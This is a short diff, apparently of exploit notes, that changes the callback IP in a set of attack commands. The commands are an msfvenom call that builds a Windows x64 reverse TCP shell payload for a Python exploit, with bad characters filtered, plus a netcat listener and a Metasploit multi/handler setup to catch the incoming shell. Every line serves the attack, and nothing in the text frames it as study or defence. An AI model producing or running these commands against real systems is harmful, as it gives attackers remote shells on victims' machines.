@@ -1,4 +1,4 @@
-msfvenom --payload windows/x64/shell_reverse_tcp LHOST=42.96.43.141 LPORT=45678 --format py --bad-chars '\x00\x09\x20\x0a\x7e' > buf.py
+msfvenom --payload windows/x64/shell_reverse_tcp LHOST=42.96.42.99 LPORT=45678 --format py --bad-chars '\x00\x09\x20\x0a\x7e' > buf.py
 
 
 
@@ -9,7 +9,7 @@ nc -lnvp  45678
 msfconsole
 use exploit/multi/handler
 set payload  windows/x64/shell_reverse_tcp 
-set lhost 42.96.43.141
+set lhost 42.96.42.99
 set lport  45678
 set ExitOnSession false
 run -jz
